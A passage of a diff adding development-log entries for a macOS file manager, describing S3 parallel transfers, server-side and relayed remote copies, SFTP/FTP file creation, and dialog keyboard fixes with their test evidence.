+billed per thousand. And an **object overwritten mid-download** can serve one version to one segment
+and another to the next — no client can close that without an identity the caller does not have, and
+the single-stream path has the same exposure in a milder form.
+
+Verified live end to end through the real `CompositeBackend` → `S3CurlTransport` → `curl`: a 40 MiB
+object came back **SHA-256 identical**, in 8 contiguous ranges covering every byte exactly once, with
+the progress deltas summing to 41 943 040. Every headless control fires on its own assertion —
+dropping `--parallel-immediate`, making the header range half-open, removing the 206 check, removing
+assembly's length check, un-indexing the write-out, dropping the cap, and each of the three callers
+dropping the hint. What is *not* measured here is the throughput gain: that needs a real link, and
+the 6,7× above is the evidence the shape rests on.
+
+**2026-08-23 — a multipart upload's parts now go four at a time.** `S3Backend+Multipart` sent one
+16 MiB part and waited for it, which is one TCP connection where a link gives far more: measured on
+this project's own account (PLAN.md §4's segmented-download probe), one stream carried 0.98 MB/s
+against 3.13 aggregate over four. So a large upload was spending most of its time not using the
+line.
+
+**One `curl` per batch, not one process per part** — the shape the segmented-*download* design had
+already argued for on the same grounds, arriving first in the other direction. `curl -Z` with an
+N-section config on stdin needs no concurrency anywhere in Swift: `S3CurlRunner` still spawns one
+child, drains both pipes, bounds the wait, and one `terminate()` on Stop stops every section (probed
+live — a cancel at 1.0 s threw at 1.06 s with the upload's `ABORT` on the wire, so nothing is left
+billing). The alternative — four `Process`es and four drains — would have put threads, a progress
+lock and four cancellation paths in the core to buy the same thing.
+
+**Four measurements decided the details, and one of them is a flag whose absence is silent.**
+Without **`--parallel-immediate`** `curl` runs the *first* transfer alone before starting the rest,
+so it can see whether the connection is reusable: four parts took **1.02 s** against **0.51 s** with
+it, all four opening at 0.000. A batch would have cost two rounds instead of one, at no visible
+symptom. The other three: every per-transfer option belongs in its own section (the credential
+included, so the secret still travels on stdin and never in `argv`); a section's write-out is
+emitted **the moment that section finishes**, which is what makes it a progress source and not just
+a result; and with the meter left on, a section finishing mid-row glues its first field to the end
+of that row (`…15.9M      s3-part4-status=200`), which a prefix-keyed reader drops — so the batch
+runs with the meter off and the write-out opens with a newline of its own anyway.
+
+**The answers are told apart by indexing the labels**, which is the same device the download design
+reached for (`s3-seg3-status=`): `S3PartWriteOut` reads `s3-part<n>-status/etag/up` out of one
+stream, in any order, from chunks split anywhere, and distinguishes a part that was *refused* (it
+has a status) from one `curl` never ran (it has nothing) — a difference that decides whether the
+upload reports a service refusal or a transport failure. Progress rides the same lines: a part
+reports its whole length the moment its status lands, which is the only observable a batch has,
+since several transfers share one meter and nothing local grows. Verified live at 5 reports for a
+5-part upload with staggered completions, summing to exactly 83 886 080 bytes.
+
+How many go at once is the **plan's**, because the bound is the disk: every part in flight is a
+slice cut to a temp file first, so `partsInFlight` is `min(4, partCount, 512 MiB / partSize)` — four
+for every ordinary upload (64 MiB staged), and it gives way rather than the disk does above 128 MiB
+parts, which the plan only reaches past 1,25 TiB. The transport verb is additive with a **forwarding**
+default, unlike the cross-bucket copy's refusing one, and the difference is the test: sequential
+parts produce the identical object, where a copy that guessed at a bucket would produce a different
+one and say nothing.
+
+Verified live against `Tooling/fake-s3-endpoint.py`, which grew multipart for the purpose: an 80 MiB
+file through the real `CompositeBackend` → `S3CurlTransport` → `curl` uploaded as 5 × 16 MiB with
+parts 1–4 opening within a millisecond of each other and part 5 following, then one `COMPLETE`
+naming 5 parts and 83 886 080 bytes. Every headless control fires on its own assertion: dropping
+`--parallel-immediate`, pinning `partsInFlight` to the policy constant alone, and un-indexing the
+write-out each break exactly the tests that name them. What is *not* measured here is a throughput
+gain — that needs a real link, and the 6,7× the download probe measured is the evidence the shape
+rests on.
+
+**2026-08-23 — and the pair S3 will copy for itself.** The staged relay below made every
+remote-to-remote pair work by moving the bytes twice through this machine, which is right for two
+protocols that cannot see each other and wrong for **two buckets on one service**: `CopyObject`
+takes an `x-amz-copy-source` naming any bucket, so S3 will read the source itself for one `PUT`. So
+the route now asks whether the two ends are a pair the *service* can name, and stages only what it
+cannot.
+
+**What decides it is a name, not a backend.** `S3Location.acceptsServerSideCopy(from:)` requires the
+same **access key id** — there is one signature, and the destination's key is what fetches the
+source — and the same **service**, because a bucket name means different things at different
+providers. That second half is the whole reason this is a predicate rather than an `isS3` test: a
+MinIO bucket named in a request to AWS does not fail cleanly, it addresses whatever bucket *AWS* has
+under that name, which can exist, be readable, and produce a copy that succeeds with the wrong bytes
+under the right name. One exception is allowed and it rests on a documented property rather than a
+guess — an AWS bucket name is globally unique across every region and account (it is what
+`BucketAlreadyExists` means), so two `amazonaws.com` endpoints cannot disagree about which bucket a
+name is. Whether AWS then performs a cross-region copy is unmeasured here and costs nothing when it
+will not.
+
+**The route carries a fallback rather than a promise**, which is what makes it safe to attempt at
+all: S3 caps `CopyObject` at 5 GiB (above it the service wants `UploadPartCopy` — not built), an
+S3-compatible endpoint need not offer a cross-bucket copy, and a bucket policy can allow the read
+through one connection and not the other. Every one of those is recoverable by moving the bytes
+ourselves, so `.serverSide` degrades to `.staged` on any failure that is not a cancellation, and the
+error the user finally reads is the staged path's — the route that would have run an hour earlier.
+Nothing about the **same-bucket** copy changed: it stays `.direct`, with the 5 GiB ceiling it has
+always had, because this pass is not about it and its live behaviour cannot be measured here.
+
+Below the route, the transport verb is additive with a **refusing** default
+(`S3CrossBucketCopyUnsupported`), the same shape `S3WriteConditionUnsupported` has and for a sharper
+reason: a transport that ignored `sourceBucket` would build the header from its own bucket and copy
+a different object under the right name, exit 0, reporting success. Which bucket a copy reads is not
+a capability to degrade; it is the request.
+
+**Verified on the wire without an AWS account**, which is the part worth keeping:
+`Tooling/fake-s3-endpoint.py` is now checked in — it verifies no signature and is useless as a mock,
+and it writes down every request, which is exactly what this needed. Driving the real
+`S3CurlTransport` through the real `CompositeBackend` against it: a compatible pair makes **one**
+request (`PUT backup/2026/a.jpg`, `x-amz-copy-source: /photos/holiday/a.jpg`) with no GET and no
+upload; the same pair against an endpoint refusing the copy makes three (the refused copy, then a
+GET and a PUT) and the object still lands; and a pair on **two ports** — two services — makes no
+copy request at all, which is the safety rule showing up as an absence. Headless controls separate
+the same three: neutering the predicate breaks only the refusal cases, dropping the bucket fork sends
+a cross-bucket copy down the same-bucket verb, and removing the fallback makes the error name the
+*destination* (its refused `PUT`) instead of the *source* (the staged download) — which is the only
+observable that tells "it fell back" from "it gave up", and needs no server to read.
+
+**2026-08-23 — copying between two remote locations, which had never been possible.** Reported by
+a user with a bucket in one pane and a server in the other: F5 answered *"Copying directly between
+remote locations isn't supported"* per file, over the Retry/Skip/Abort dialog. True of the backend
+and not of anything else — and the same refusal covered a case nobody had thought to try, since
+**SFTP and FTP have no copy verb at all**, so duplicating a file inside *one* account was equally
+dead. `copyFile` there is a *direction*: `sftp`'s `get`/`put`, `curl`'s download/upload, each
+refusing any pair of ends without a local side.
+
+The fix is the obvious mechanism and the decision was where to put it. **A backend cannot run it**
+— neither end has heard of the other — so it belongs to whoever holds both connections, which in
+the app is `CompositeBackend` and in the core is a caller-driven `RelayCopy`: download to a private
+staging directory, upload, delete, with the staged name **sanitised** because it comes from a remote
+listing (a stranger's choice, the same reasoning that refuses CR/LF in an FTP path). Progress is the
+part with a rule in it: the queue's denominator is the file's size, so reporting both legs would
+drive the bar to 200 % — each leg reports at **half weight** and the tail reconciles against the
+staged file's exact size, which also absorbs an upload that reports nothing at all (`sftp` prints no
+meter a spawned process can read). A partial upload is deliberately left where the destination
+backend left it, exactly as a direct upload leaves one.
+
+**Which pairs need staging is a capability rather than a list of backends.** `VFSCapabilities`
+gained `.internalCopy` — "this backend can copy with both ends inside itself" — carried by
+`LocalBackend` and by `S3Backend`, whose `x-amz-copy-source` keeps the bytes inside the service. So
+`CompositeBackend.transferRoute(from:to:)` answers `.direct` for a same-backend copy that backend
+can serve, `.direct` for an upload or a download, and `.staged` for everything else; a same-bucket
+S3 duplicate is untouched, which is the narrowness control that costs money if it breaks. Spelling
+the backends out at that one site instead is the shape this file keeps finding on the wrong side of
+a fix. A **move** needed nothing: `moveItem` already answers `EXDEV` across backends, so
+`CopyEngine` runs it as copy-then-delete, and a whole folder recurses through `createDirectory` on
+the destination backend the way an upload already did.
+
+Verified live against two real servers on this Mac — a non-root `/usr/sbin/sshd` on 2222 and
+`pyftpdlib` on 2121 — through the real `SFTPProcessTransport` and `FTPCurlTransport`:
+SFTP → FTP, FTP → SFTP, a duplicate inside one SFTP account, and a whole `CopyEngine.run`, all
+byte-identical with the staging root empty afterwards (`RemoteRelayLiveIntegrationTests`, gated on
+both existing live config files). The negative control is the report itself: with the staging route
+removed, all four fail with `.unsupported(.remoteToRemoteCopy)` — the user's sentence, verbatim. The
+headless controls separate cleanly too (removing the halving reports 8192 of 4096 bytes; removing
+the cleanup fails only the three staging assertions; removing the name guard fails only the hostile
+name), and the three narrowness tests stay green throughout.
+
+Two costs are stated rather than solved. A relayed file **occupies its own size on this disk** for
+the length of the transfer, which is what "no single backend can carry these bytes" means in
+practice — there is no free-space pre-check, since knowing the size at that point costs a round trip
+per file. And a **cross-bucket S3 copy is staged like any other pair**, though `x-amz-copy-source`
+can name a different bucket: it needs one credential authorised on both and the same endpoint, which
+is a check with its own failure modes and was not taken here.
+
+**2026-08-23 — the remote save-back stopped asking when it has nothing to say.** Reported by a
+user editing a file over FTP: every ⌘S raised *"Upload “test.txt” back to the server?"*, whose body
+said the server's copy was exactly as downloaded. One dialog per save, for the life of the edit —
+`EditedFileRegistry` deliberately keeps watching after an upload — while the local F4 this is the
+twin of asks nothing at all. Three things decided it. **The trigger is the user's own ⌘S**, so on
+the unchanged path the dialog confirmed an intent already stated. **The archive arm's reason does
+not carry over**: a repack rewrites the whole container and every other member with it, where an
+upload replaces the one file being edited with the version just saved, which is what "save" means.
+And **the FTP body argued against itself** — it named a real weakness (a `LIST` stamp is year-less,
+zone-less and on the server's clock, so "same size and date" misses most of a working day) and then
+offered two buttons resting on that same evidence, with no way to strengthen it and the same
+sentence again on the next save. Reporting a caveat nobody can act on is what `RemoteFileRevision`
+already refuses to do with a confidence percentage; this is that rule one layer out. So
+`writeBackBody` became `writeBackConcern`, returning `String?`: `nil` for every shape of an
+unchanged verdict, and the three answers that carry a fact the user has to weigh — somebody else
+wrote this file, the check could not be made, nothing was recorded to compare against — keep the
+dialog unchanged. The grading that had ranked those unchanged shapes went with the wording it
+existed to produce: `RemoteRevisionEvidence`, `RemoteFileRevision.evidence(comparedWith:)`, the
+`timestampIsApproximate` field feeding it and `VFSBackendID.hasApproximateTimestamps` feeding
+*that* were all removed as unused core API, leaving `isSuperseded(by:)` as the whole comparison
+(6 core tests and one suite dropped; the FTP fact stays in NOTES.md ▸ curl and in `isFTP`). The upload now reports on the **status line** instead, since an upload
+that leaves no trace is indistinguishable from one that never happened; measured at 230 pt (43-char
+name: 427 pt) against the 542 pt the pane gives that label, across all fourteen catalogs. The
+`If-Match` precondition, the refused-precondition escalation and the failure alert are untouched.
+Both negative controls run and are cleanly separated: putting the old always-ask back fails only the
+four "don't interrupt" cases, and over-correcting to never-ask fails only the five that must still
+stop the user. The live S3 suite gained the same assertion against a real endpoint, on both sides.
+Nothing automated could have found this — the dialog was *correct*, every test was green, and the
+English screenshot is perfect; it needed somebody saving a file ten times.
+
+**2026-08-23 — two `VFSBackend` contracts that no backend kept, one of them load-bearing.** Fell
+out of the ⇧F4 pass below, from a single aside: `moveItem`'s doc promised `.alreadyExists` for an
+occupied destination and SFTP's `rename` had just been measured overwriting silently. Checking the
+other three made it worse rather than better — **no** backend has ever delivered it for the case
+that matters. Local `rename(2)` *replaces* a destination file and yields `.alreadyExists` only from
+`ENOTEMPTY` (a directory onto a **non-empty** directory); OpenSSH's `rename` uses the POSIX-rename
+extension and overwrites, its directory refusal arriving as a bare `Failure` → `.io`; FTP's
+`RNFR`/`RNTO` overwrote on the server measured, its refusal a 550 → `.notFound`; S3's copy-then-
+delete overwrites unconditionally. The tell that it was documentation rather than behaviour: every
+caller had already worked around it *independently* — `PanelViewController+Rename` and
+`+TrashRestore` each `stat` first, both with a comment naming `rename(2)`'s overwrite, and
+`MultiRename.plan` refuses a colliding name upstream of the apply loop. Three correct workarounds
+under a sentence saying they were unnecessary. Corrected to say what is true, with the per-backend
+table, since a contract nobody can key on is worth stating precisely once.
+
+**The neighbouring claim was the same defect with teeth.** `createDirectory` promises
+`.alreadyExists` too, and there a caller believed it: `PanelViewController+Copy.submitBranchTransfer`
+skips an already-present intermediate directory by catching exactly that, so a tree-mode branch
+transfer into a remote destination failed outright the moment one existed — and F7 on a taken name
+reported `.io`'s or `.notFound`'s sentence instead of "already exists". Measured rather than
+inferred: `sftp`'s `mkdir` onto an existing directory answers `remote mkdir "…": Failure` (SFTP v3
+has no "already exists" status, so `EEXIST` arrives as `SSH_FX_FAILURE`) and FTP's `MKD` answers
+550, its one ambiguous refusal.
+
+Fixed in `RemoteTransportBackend.createDirectory` rather than at either caller — one backend-side
+answer serves both consumers, where two workarounds would have been the third and fourth copies of a
+rule this project keeps finding on the wrong side of a fix. A *failed* create disambiguates with a
+`stat`, which is the shape `S3Backend`'s own existence check already settled on: the happy path pays
+nothing, and only a name about to be refused pays to have the question answered. Two properties keep
+it from becoming "every refusal is a collision", and both are pinned headlessly and live — a refusal
+that is not about the name keeps its own error, and a `stat` that cannot be had leaves the original
+error standing rather than reading as either answer. `S3Backend` stays outside the fix on purpose:
+its folder is a zero-byte marker, so a second create destroys nothing and has nothing to
+disambiguate.
+
+The negative control reproduces the report verbatim — reverted, the three taken-name tests fail with
+`.io(code: 5)` on SFTP and `.notFound` on FTP while all five narrowness controls stay green — and
+the live suites were re-run over SFTP, plain FTP and FTPS.
+
+**2026-08-23 — ⇧F4 "Edit File…" creates a file on a server (SFTP, FTP and FTPS).** Reported with a
+screenshot: the dialog opens on a connected SFTP pane, takes a name, and answers *"This location
+doesn't support creating files."* Everything around it was already right — `canCreateFileHere` reads
+`.write` plus a real `creationDirectory`, both true of a remote pane, and `canEditRemoteFile` is
+backend-agnostic — so the whole gap was one verb: `VFSBackend.createFile` had no implementation
+below `RemoteTransportBackend`, and the protocol default throws `.unsupported(.createFile)`. The
+route the created file then takes to the editor and back has worked since the previous day's pass.
+
+The design came out of the probes rather than the other way round, and two of them inverted the
+obvious implementation. **Over FTP, `--append` sends `APPE`, which creates an absent file and leaves
+a present one byte-for-byte untouched** — as close to create-if-absent as FTP gets — while plain
+`-T` sends `STOR` and truncates; so the window between a client-side check and the write is benign
+there. It is nonetheless tried *with* a `STOR` fallback, because a server that grants `STOR` and
+refuses `APPE` answers exit 25 / 550, reproduced by withdrawing exactly that permission from a real
+account. **Over SFTP there is no such option at all**: `put` truncates, `put -a` can neither create
+nor overwrite, and `rename` silently overwrites its destination (OpenSSH uses the POSIX-rename
+extension), so all three candidates were measured and all three refused. The race is stated rather
+than papered over — S3 closes the same window with `If-None-Match`, FTP softens it with `APPE`, and
+SFTP cannot.
+
+The `stat` guard is therefore load-bearing twice over, and the second reason is the one no fake could
+have found: **`sftp`'s `put` aimed at an existing directory exits 0 having created
+`<directory>/<the local file's basename>`** — so an unguarded create aimed at a folder's name would
+drop a file named after a *temporary* file inside a folder nobody was editing, with every layer
+reporting success. `curl` refuses the identical thing with 550, so the two protocols fail in opposite
+directions and the guard is what makes them behave the same; that is the argument for it living in
+`RemoteTransportBackend` rather than in either transport. One verb (`RemoteWriteTransport
+.createEmptyFile`) and one `createFile` now serve both backends.
+
+Verified against real servers rather than only doubles — a local `sshd`, `pyftpdlib` plain, and
+`pyftpdlib` over explicit FTPS with a pinned self-signed certificate, which is what an FTPS server
+usually is. The FTPS run's own log is the clearest evidence the guard works from outside: one
+`APPE … bytes=0`, and **no** upload attempted for either of the two names already taken. The
+`STOR` fallback was exercised live by running the same suite against a server with append withdrawn.
+`FTPLiveIntegrationTests` is new and file-gated like the SFTP one; `SFTPProcessTransport` split at
+the `type_body_length` ceiling into a `+Process` companion, by concept and mirroring the shape
+`FTPCurlTransport` already had.
+
+One live assertion was written and then deleted, which is the pass's own lesson: "a create leaves an
+existing file's bytes alone" is true on an `APPE` server and false on a `STOR`-only one, so as a live
+test it is a claim about the endpoint wearing a claim about the code — the shape NOTES.md records as
+the kind that expires the day the suite meets a different server. What the project can hold itself
+to, that the non-destructive verb is the one *tried first*, is pinned deterministically in the pure
+argument-builder suite instead.
+
+**2026-08-22 — remote write-back was already shipped for SFTP and FTP, and had never worked.**
+Opened as "build the write-back slice the plan says is open" and the first hour of it was reading:
+`editRoute(for:)` has answered `.remoteFile` for every backend that accepts uploads since M21 Slice
+10, `RemoteFileRevision`'s own doc comments name SFTP and FTP throughout, and the upload falls
+through to a plain `copyFile` where there is no conditional writer. So there was nothing to build —
+and running it once against a real NAS showed why nobody had noticed it was broken: **every** save
+answered *"The file on the server has changed since you downloaded it — someone else has edited
+it."* on a file nothing had touched. That is the sentence the whole feature exists to get right.
+
+The cause is one line in `ColumnarListing`, and it is a *shared* line: `formatter.defaultDate =
+Date()`. `DateFormatter` fills every component the format does not name from that, and a year-less
+`MMM d HH:mm` names no **seconds** — so each parse stamped the row with the second and millisecond
+it ran at, and the listing's date (recorded at fetch) could never equal the pre-upload `stat`'s.
+Probed in the running app: 36 bytes both sides, dates **39 s** apart, the fractional part of each
+matching the log line that printed it. Fixed by truncating the anchor to the minute, so it can
+contribute only the year; re-measured, both sides read `1787431680.0` exactly.
+
+**S3 could not have caught it, which is the part worth carrying.** An entity tag settles
+`isSuperseded(by:)` before the date is consulted, and this feature's only live suite
+(`RemoteFileEditLiveIntegrationTests`) is S3-only — so the one backend that was verified is the one
+backend immune to the defect, and 2544 core plus 634 app tests were green throughout. A
+backend-agnostic feature verified against one backend is verified against one backend.
+
+Verified live afterwards on both: an edit made in TextEdit reached the server over SFTP and over
+FTP, each confirmed by reading the bytes back over the *other* protocol; the FTP-only
+"`LIST` times are year-less and on the server's clock" sentence appeared for the first time (it was
+unreachable while the date always differed); a genuine outside write is still caught — on
+`sizeDiff`, both writes having landed in the same minute, which is exactly the blind spot that
+wording admits; and declining leaves the server untouched. Three core tests pin the parser, and the
+negative control fails 3/3 — the first version of them passed on the broken code about half the
+time, because two parses can agree by luck and only "carries no seconds" cannot
+(docs/NOTES.md ▸ Parsing a year-less timestamp).
+
+**2026-08-22 — `..` and Go Up, watched by a person on a real SFTP, FTP and FTPS server.** M21's
+last undone item, and the one thing about that fix a test could not close: the predicate is single
+(`canGoToParent`), but the claim was about what somebody sees. Driven against a NAS on 192.168.1.3
+over all three protocols, each standing in `/home` and walking up to the connection root. Inside
+`/home` the synthetic `..` row is drawn, Backspace walks up, a double-click on the row walks up, and
+Go ▸ Up (⌘↑) is enabled — landing the cursor on the folder just left, over the network as it does on
+disk. At the root, where `parentPath` is `nil` because a connection's root has nothing above it,
+there is no `..` row and the menu item is **grayed**. That enabled/grayed pair is the narrowness
+control and is the half a single reading cannot give: "Go Up works" and "Go Up is offered
+everywhere" look identical from inside `/home`.
+
+Nothing was wrong, which is the usual outcome for an item like this and is still the last signal a
+shipped fix gets. Three things the session re-confirmed rather than found, all already in NOTES.md:
+`sftp -b -` forces `BatchMode=yes` and refuses password auth outright (`Permission denied
+(publickey,password)`) where the identical commands on piped stdin connect; an FTP `LIST` stamp is
+the server's own clock, so the same four folders read **three hours earlier** over FTP and FTPS than
+over SFTP — the daemon's timezone, not a parse, and exactly the approximation M13 accepted; and this
+server's FTPS is self-signed (`curl` exit 60 against a fresh trust store), so the saved record
+reconnected silently on its pin, which is the branch the M13 follow-on added and the one that
+otherwise only gets exercised by a first contact.
+
+**2026-08-22 — `PanelPassiveRefreshTests` failed one full run in four, and none of it was the
+product.** It measures that a listing refresh finding nothing changed does not reload the table, and
+the only observable available is the table's **selection** — which answers every repaint from
+anywhere in the process. Logging every `renderRefresh` with its call stack found three races, all in
+the fixture: the "has it listed yet" wait was satisfied by an **empty** pane (the `..` row is drawn
+and selected first), so the navigation's own reload landed *inside* the quiesce; the measured refresh
+**pulled** the sync provider's first snapshot, which publishes into a shared cache after the listing
+lands, and repainted 650 ms into the quiet window; and 58–66 repaints per run arrived from other
+suites writing preferences through `AppPreferences.shared`.
+
+The fixture now waits on the **entries**, consumes the refresh tail itself (the same three
+`update*Status()` funnels both refresh paths wake), and waits on the providers' own caches rather than
+on a duration — with one trap paid for on the way: pulling every 300 ms *starves* the scan it waits
+for, because `DirectoryScanCache` debounces by exactly that and cancels the pending timer each time.
+The pane is also deafened outright (`removeObserver` after `loadViewIfNeeded`), which is belt and
+braces: reverting it alone left six runs green. 16 consecutive full runs are green, and the negative
+control still fails all three no-repaint tests with the unchanged-guards removed while the narrowness
+control stays green.
+
+**2026-08-22 — an edited S3 object uploaded, and the row went on saying `Zero KB`.** The fifth in
+the day's chain, and the one that shows the family's real subject: the *window*, not the pane, asks
+"who is showing this directory". After a save-back `refreshPanesShowing(path.parent)` re-listed the
+pane whose `panel.path == directory` — true in a flat list, false in a **tree**, which draws several
+directories at once. Edited from an account pane with its bucket expanded, the object's parent sits
+two levels below the path being compared, so neither pane matched and nothing refreshed. Everything
+else worked: the `PUT` landed, the re-baseline ran, the server had the new bytes.
+
+`PanelViewController.isShowing(_:)` is the one question now, and what makes it right is that it asks
+the **rows**: `TreeProjection` files an expanded level under the row that was expanded, so a bucket's
+children sit under `s3account:/<bucket>` while every row inside carries `s3://…` — matching the
+tree's listing keys would still have answered no. Both controls were run, and the second is the one
+worth keeping: pane-path-only fails 2 of the 4 tests, listing-keys fails exactly 1, the reported
+shape. The pane's own path stays in the union regardless, since an empty directory has no row to
+derive it from and is where a create lands. The sibling sites were checked and left alone — a pack
+writes to `destinationPane.panel.path` and the archive write-back keys on `backend.archivePath`, so
+neither can name a directory its pane merely draws.
+
+**2026-08-22 — ⇧F4 handed the editor a file that lives on a server.** The fourth in the same day's
+chain and the first that was never about the tree. F4 has routed by the row's own backend since M21
+Slice 10 — that is what `editRoute(for:)` is — and **⇧F4 had a second spelling that knew only about
+this Mac**: whatever its dialog resolved went straight to `openInEditor`, whose `localURL` is
+`file://` plus the path *inside* the backend. So the Edit button asked macOS to open `/test2.txt`,
+Finder answered that the file couldn't be found, nothing was ever downloaded — and F4 on that same
+row would have opened it correctly.
+
+Both of ⇧F4's call sites were wrong and only one is in a report: the name that is already there, and
+the name it **creates**, which reads as working for longer because the object really does appear on
+the server before the editor is asked for a path that has never existed. There is one dispatch now
+(`openForEditing`), which is what extracting `editRoute` was for — arriving on the *act* rather than
+on the decision. The created file is read back rather than assumed: a route is decided from an entry,
+and a remote one's fetch and its later save-back are keyed on the size, time and entity tag only a
+`stat` carries, so a hand-built stand-in would save one round trip and make the very first save look
+like somebody else's write. The rest of the family audits clean — Enter's `NSWorkspace.open` and
+`handoffTargets` (Open With, Share) both already gate on `backend == .local`.
+
+The test drives the real flow on a pane with no `PanelHost`, so the remote route stops at a fetch it
+cannot start; the discriminator is `transientStatusToken` rather than the status line itself, because
+"Opening …" clears itself after four seconds while the reverted build's doomed launch takes about
+sixty to fail. Reverted, both tests fail — and TextEdit is asked for a file that is not there, which
+is the user's screenshot.
+
+**2026-08-22 — a rename inside an expanded bucket left the old name on screen.** The third bug in
+one day's chain: F2 now reached the row and the delete now swept the right keys, so the rename
+finally worked end to end — and the tree went on drawing `test3` for a folder that was `test4` on the
+server, for the rest of the session.
+
+`refreshTree` re-read every listed directory with `DirectoryLoader.list`, which is not how half of
+them were produced. A **bucket row** hangs under an `s3account:` path, and `S3AccountBackend`
+answers for its root and nothing deeper by design — so the re-read threw `notFound` into a `try?`
+and the row kept the entries it already had. Nothing logged, every request succeeded, and it is the
+*whole* refresh funnel: F7, F8 and the queued rename an S3 prefix becomes all reach it through
+`refreshPanes`. The fix is one line of routing — the refresh re-reads through `treeChildEntries`,
+the same funnel the expansion used, so the two cannot drift.
+
+What that costs is the other half. A refresh now arrives at an already-open bucket, and answering it
+by *connecting* again would spend a second billed probe, a Keychain write and a re-registration to
+land on the root it had already settled on — so the tab records where each expanded bucket's rows
+were listed from (`PanelTab.s3BucketRoots`, `mergedSources`' shape one level down) and re-lists that
+directly, falling back to the full connect when the listing fails so a dropped registration heals
+itself. The tests stand a real local directory in for the connected root, which is exactly what that
+record means, so the whole path runs with no network; reverted, the first one fails with
+`names → ["test3"]` — the user's screenshot, verbatim.
+
+**2026-08-22 — F2 in an S3 tree did nothing, and the rename that followed it left the folder under
+two names.** Two independent bugs behind one report, and the second is the older and worse of them.
+
+The dead key was a gate reading the **pane** where it meant the **row**: `canRenameHere` asked
+`capabilities(for: panel.path)`, so in an S3 *account* pane — whose own rows are buckets, which S3
+cannot rename at any level — the answer was "no rename here" for every row, including a prefix three
+levels inside an expanded bucket. It is the seventh instance of that family (docs/NOTES.md ▸ Design
+lessons) and the second on this very predicate, so the fix names the subject rather than the site:
+the gate is the row's own directory, which is what `performRename` had always built the destination
+in. A cursor on a bucket row still answers with the account and is still refused.
+
+Renaming then produced a **duplicate**, because a folder rename is `EXDEV` → copy the subtree →
+delete the source, and the delete swept keys in the wire's spelling. A page's keys arrive
+form-urlencoded under `encoding-type=url`, and `S3Backend.allKeys(under:at:)` was the one enumeration
+that never decoded them — so `DeleteObjects` was handed `untitled+folder/…` for keys stored
+`untitled folder/…`. S3's delete is idempotent, `<Quiet>true</Quiet>` leaves the body empty, and
+there is no `<Error>` row: the request succeeded and deleted nothing. **F8 on any folder holding a
+name with a space had been silently doing nothing since the backend shipped**; the rename is merely
+what made it visible. Every fixture in `S3Fixtures` declares that encoding and none of their keys has
+a character it touches, which is why the corpus could not see it — the same disjoint-corpus trap as
+the 2026-08-18 whitespace bug, with the halves swapped.
+
+The gate's second half changed with it. `!isVirtualDirectory` was standing in for one real fact — the
+merged iCloud listing draws an **app's** name over its `Documents` folder — and refusing every
+ordinary row beside those. `FileEntry.nameMatchesPath` says what was meant, so rename now works on a
+loose file in that listing, on a search hit, and at every level of a tree over either, while the
+three refusals that had shared the flag each state their own reason. Two things that cost more than
+the widening: a search snapshot re-lists nothing by design, so a renamed hit is substituted in place
+(`substituteSearchHit`) rather than left drawing a name that is no longer on disk; and `.rename` is
+now withdrawn **inside a Trash**, because Put Back is keyed on the item's name there and renaming a
+trashed file orphans its `.DS_Store` record silently and for good.
+
+**2026-08-21 — ⎋ and ⏎ on a dialog raised by a modifier chord, which is unanswerable until the
+user lifts the modifier.** Reported the day after the entry below, against the remote-download
+confirmation: ⎋ needed two presses and ⏎ never worked at all. Nothing was wrong with the binding this
+time, and every window-state reading was clean — the sheet was key, `Cancel[⎋]`/`Download[⏎]` were
+correctly bound, no Quick Look panel existed, and the Quick View key monitor bowed out exactly as
+designed. AppKit matches a key equivalent on the character **and** the exact modifier mask, and ⌃Q
+raises that dialog **53 ms** after the chord, so the key arrives with Control still down and is
+refused — `performKeyEquivalent` returns `false`, the event reaches `keyDown:`, nothing handles it,
+beep. Standard macOS, and ordinarily unreachable because a confirmation is raised by a click; Dirnex
+raises them from ⌃Q, ⇧F8, ⌘F5 and ⌘F2. `enableEscapeToCancel` now captures `NSEvent.modifierFlags`
+at build time — it runs synchronously inside the action the chord invoked, so that set is exactly
+the chord's — and `AlertKeyCatcher` answers ⎋/⏎ whose modifiers are a **subset** of it. Deliberately
+*stale*, not *any*: an alert raised by a click captures nothing, so every such dialog is unchanged,
+and a deliberate ⌘⏎ can never confirm a ⇧F8 delete, which is what made forgiving the committing key
+affordable at all. Two presses from byte-identical window state is what said to stop instrumenting
+the window and instrument the event; the full diagnosis, and why a test suite that presents real
+sheets kills the test host, are in [NOTES.md](NOTES.md) ▸ AppKit. **A second, intermittent refusal
+was found underneath it and fixed in the same pass**: a *bare* ⎋ or ⏎ that the alert declines with
+every measurable property identical to a press that worked. A witness inside the key-equivalent walk
+showed that `Cancel[⎋]`'s own binding never matches during the walk *even when the dialog works* —
+the alert is answered afterwards through the responder chain, and that step intermittently does not
+run. `AlertKeyCatcher` is walked last, so it now claims the bare keys as well, which cannot
+double-answer and makes the first press decide. Worth knowing for the next hunt: a heavy probe in a
+key monitor masked the race for five reproductions, and one short log line caught it.
+
+**2026-08-20 — ⎋ and ⏎ on the app's dialogs, which were dead on different alerts for different
+reasons.** Reported as both keys "sometimes" doing nothing but beep. Two independent defects, each
+invisible to the tests that covered the other key. **Escape** was dead on all three progress sheets
+(remote download, iCloud download, search): `enableEscapeToCancel` served a lone-button alert by
+installing its catcher in the `accessoryView` slot, which is a **no-op in both call orders** once the
+alert has a real accessory — `accessoryView == nil` fails when the accessory is set first, and the
+caller's own assignment throws the catcher away when it is set second. **Return** was dead on the SSH
+host-key prompt, both FTPS certificate prompts and Full Disk Access's already-granted notice: where
+the safe choice occupies the default (first-added, rightmost) slot, AppKit withholds
+`defaultButtonCell` outright, so Return *and* keypad Enter fall through to the beep — measured, and
+the control with `enableEscapeToCancel` removed behaves identically, so it is AppKit's doing rather
+than ours. The helper now decides by what else answers Return: while another button is the default,
+Escape rides the safe button (the ordinary `Delete[⏎] Cancel[⎋]` confirmation, unchanged); otherwise
+the safe button keeps Return and Escape rides an `EscapeDismissingView` installed in the alert
+window's own `contentView`, which is what makes the whole thing independent of call order. Note the
+deliberate consequence on the four trust prompts: **⏎ now answers Cancel**, which is what putting
+Cancel in the default slot always meant. `scripts/check_alert_escape.py` had reported "all 70 NSAlert
+sites call `enableEscapeToCancel()`" throughout — true, and no evidence at all, since it could only
+see the call and not the binding; it now also fails on a call that runs before the last `addButton`
+(verified against a synthetic violation), and the binding itself is pinned by
+`EscapeToDismissTests.everyShapeAnswersBothKeys`, which asserts the **pair** on every shape the app
+builds and fails with 18 issues when reverted, naming both halves. Four other mechanisms were probed
+and cleared before the binding was suspected — the Quick View key monitor (the parent window reports
+`isKeyWindow == false` while a sheet is up, so it already bows out), `focusTable()`'s
